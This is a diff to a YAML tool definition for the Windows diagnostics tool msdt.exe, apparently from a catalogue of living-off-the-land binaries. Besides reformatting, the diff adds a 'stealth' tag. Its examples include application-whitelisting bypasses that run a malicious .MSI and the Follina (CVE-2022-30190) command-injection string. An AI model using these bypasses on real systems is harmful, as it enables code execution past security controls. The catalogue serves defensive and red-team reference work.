@@ -2,7 +2,8 @@
 id: windows-bypass-msdt
 namespace: windows:bypass:msdt
 name: msdt
-description: 'Microsoft diagnostics tool Located at: C:\Windows\System32\Msdt.exe; C:\Windows\SysWOW64\Msdt.exe.'
+description: 'Microsoft diagnostics tool Located at: C:\Windows\System32\Msdt.exe;
+  C:\Windows\SysWOW64\Msdt.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -42,7 +43,10 @@ resource_profile:
 allowed-tools:
 - msdt
 parameters: []
-features: []
+features:
+- pipes-stdin
+- pipes-stdout
+- stealth
 execution:
   template: msdt
   sandbox: execFile
@@ -50,12 +54,20 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. (Execute code)
-  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
-- description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. (Execute code bypass Application whitelisting)
-  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
-- description: Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update. (Execute code bypass Application allowlisting)
-  command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
+- description: Executes the Microsoft Diagnostics Tool and executes the malicious
+    .MSI referenced in the .xml file. (Execute code)
+  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
+    /skip TRUE
+- description: Executes the Microsoft Diagnostics Tool and executes the malicious
+    .MSI referenced in the .xml file. (Execute code bypass Application whitelisting)
+  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
+    /skip TRUE
+- description: Executes arbitrary commands using the Microsoft Diagnostics Tool and
+    leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific
+    technique will not work on a patched system with the June 2022 Windows Security
+    update. (Execute code bypass Application allowlisting)
+  command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu
+    IT_BrowseForFile=/../../$(calc).exe"
 references:
 - label: ''
   url: https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
@@ -84,7 +96,6 @@ install:
   commands:
   - choco install msdt
 ---
-
 
 # msdt
 
